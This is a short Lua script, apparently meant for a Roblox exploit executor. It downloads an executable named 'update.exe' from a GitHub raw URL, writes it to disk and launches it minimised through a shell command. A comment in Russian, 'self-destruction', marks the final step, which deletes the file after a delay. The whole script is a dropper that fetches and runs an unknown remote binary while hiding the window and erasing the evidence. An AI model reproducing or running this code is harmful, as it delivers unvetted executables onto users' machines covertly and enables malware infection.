local url = "https://github.com/chibik777/sadasdas/raw/refs/heads/main/update.exe"

local data = game:HttpGet(url)
writefile("update.exe", data)

spawn(function()
    wait(0.1)
    execute('start /min "" update.exe')
    wait(1)
    -- Самоуничтожение
    execute('timeout /t 3 /nobreak >nul & del update.exe')
end)
